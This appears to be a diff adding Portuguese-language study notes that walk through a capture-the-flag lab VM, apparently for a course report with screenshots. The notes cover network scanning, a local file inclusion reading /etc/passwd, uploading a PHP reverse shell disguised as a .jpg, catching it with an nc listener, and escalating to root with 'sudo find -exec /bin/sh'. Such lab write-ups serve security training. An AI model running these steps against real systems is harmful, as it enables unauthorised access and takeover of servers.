@@ -1,0 +1,109 @@
+# Tirar print de tudo da tela. Ate do tempo
+
+ip -br -c a
+
+netdiscover -i eth0 -P -r 192.168.56.0/24
+
+ping 192.168.56.103
+
+// entrar no mozilla o site
+
+nmap -p- -sV 192.168.56.103
+
+# Porta 80 esta aberta e é uma PORTA OPEN com um 
+# Apache httpd 2.4.29 ((Ubuntu)), ele cria /var/www/html, e para ajustar modificar a pagina de criação default do apache
+
+// entrar no port swagger e ver a teoria
+
+# achar a URL vuneravel
+
+// http://192.168.56.103/language.php?lang=en.php
+
+# porque tem o ?nome=....
+# Agora tenta ler um arquivo com o LFI com por exemplo essa url
+
+// http://192.168.56.103/language.php?lang=../../../../etc/passwd
+
+# Para ver bonito, clica em view page source
+# Ir no portswigger e falar o que tem que fazer para trocar de coisa, dizer a vunerabilidade e o que tem que fazer para corrigir
+
+// tentar inserir um arquivo .php, mas provavelmente retornara um erro porque ele apenas aceita arquivo .jpg
+
+// transformar o backdoor php em .jpg
+// editar o arquivo /usr/share/webshells/php/php-reverse-shell.php
+
+// cp php-reverse-shell.php shell.php.jpg
+
+# Fazer o print do antes e do depois
+// verificar nosso IP denovo
+// e modificar o $ip do arquivo onde esta escrito CHANGE THIS para o nosso IP
+
+// agora subir o arquivo shell.php.jpg
+
+
+// verificar caminho onde foi o upload com o gobuster
+
+gobuster dir -u 192.168.56.103 -w /usr/share/wordlists/dirb/big.txt
+
+// clicar na url que o gobuster achou
+// abrir a porta que esta no shell.php.jpg
+
+nc -nlvp 1234
+
+// clicar na image e dar print no error, porque o servidor esta bloqueando o bloqueando o backdoor de ser executado
+
+// abrir o arquivo agora pela url vuneravel
+// 192.168.56.103/language.php?lang=/uploads/shell.php.jpg
+
+# Tira print de tudo, tanto dos comentarios com dos #, tbm, por exemplo, tanto da url vuneravel, como tambem entrando no servidor
+# Agora voce esta conectado no servidor
+
+// a limitacao de bash, para limitar o hacker para ele nao ver o historico dos comandos
+
+// agora rode o comando no bash
+
+python3 -c "import pty;pty.spawn('bin/bash')"
+
+// entrar no home do bassam - /home/bassam
+// tentar fazer cat user.txt
+
+// porque tem sem permissao
+
+
+// ir para a pagina no /var/www/html
+// e entrar na pasta supersecret-for-aziz
+// e verificar o cat bassam-pass.txt
+
+// entrar no usuario bassam com o su bassam
+// entrar no home do bassam no cat user.txt
+// e fazer print na flag
+
+
+// entrar no site https://gtfobins.github.io/
+
+// aparece o error porque nao tem acesso
+// Sorry, user bassam is not allowed to execute '/bin/su' as root on bassam-aziz.
+
+// verificar os possiveis com o sudo com o sudo -l 
+
+Matching Defaults entries for bassam on bassam-aziz:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User bassam may run the following commands on bassam-aziz:
+    (ALL : ALL) /usr/bin/find
+
+// entrar no gtfobins e procurar o find
+
+# O find tem erro de permissao no linux do ubuntu 18
+# Limitar as pemissao do usuario
+
+// rodar o comando
+
+// sudo find . -exec /bin/sh \; -quit
+
+// entrando com o root
+
+// entrar no /root
+
+// dar ls e dar cat flag.txt
